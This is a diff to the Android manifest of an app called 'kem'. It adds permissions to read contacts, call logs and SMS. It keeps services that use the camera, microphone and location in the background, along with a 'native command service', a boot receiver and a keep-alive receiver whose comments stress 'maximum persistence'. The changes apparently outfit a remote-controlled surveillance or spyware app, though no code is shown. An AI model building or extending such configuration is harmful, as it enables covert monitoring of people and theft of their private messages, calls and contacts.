@@ -2,7 +2,7 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
           xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- Essential permissions -->
+    <!-- Essential permissions for native operations -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
@@ -11,7 +11,7 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     
-    <!-- Background service permissions -->
+    <!-- Enhanced background service permissions -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
@@ -21,16 +21,27 @@
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
     
-    <!-- Audio recording permission for voice commands -->
+    <!-- Native audio recording permission -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     
-    <!-- Boot receiver permission -->
+    <!-- Data access permissions for native operations -->
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    
+    <!-- Boot receiver permission for auto-start -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
     
-    <!-- Additional permissions for enhanced background operation -->
+    <!-- Additional permissions for enhanced native operation -->
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
     <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT"/>
+
+    <!-- Camera features -->
+    <uses-feature android:name="android.hardware.camera" android:required="true" />
+    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
 
     <application
         android:label="kem"
@@ -38,6 +49,7 @@
         android:requestLegacyExternalStorage="true"
         android:allowBackup="false"
         android:supportsRtl="true"
+        android:largeHeap="true"
         tools:replace="android:label,android:allowBackup">
 
         <activity
@@ -61,7 +73,7 @@
             android:name="flutterEmbedding"
             android:value="2"/>
 
-        <!-- Enhanced background service configuration -->
+        <!-- Flutter background service (minimal) -->
         <service
             android:name="id.flutter.flutter_background_service.BackgroundService"
             android:exported="false"
@@ -70,16 +82,17 @@
             android:foregroundServiceType="location|camera|microphone"
             tools:replace="android:exported"/>
             
-        <!-- NEW: Native command service for independent operation -->
+        <!-- Enhanced native command service for independent operation -->
         <service
             android:name=".NativeCommandService"
             android:exported="false"
             android:enabled="true"
             android:stopWithTask="false"
             android:foregroundServiceType="location|camera|microphone"
-            android:priority="1000"/>
+            android:priority="1000"
+            android:isolatedProcess="false"/>
             
-        <!-- Boot receiver to restart services -->
+        <!-- Enhanced boot receiver to restart services -->
         <receiver android:name=".BootReceiver"
             android:enabled="true"
             android:exported="true"
@@ -95,7 +108,7 @@
             </intent-filter>
         </receiver>
         
-        <!-- NEW: Keep alive receiver for enhanced persistence -->
+        <!-- Enhanced keep alive receiver for maximum persistence -->
         <receiver android:name=".KeepAliveReceiver"
             android:enabled="true"
             android:exported="false">
@@ -107,7 +120,7 @@
             </intent-filter>
         </receiver>
         
-        <!-- NEW: Job service for Android 8+ background limitations -->
+        <!-- Job service for Android 8+ background limitations -->
         <service
             android:name=".PersistentJobService"
             android:permission="android.permission.BIND_JOB_SERVICE"
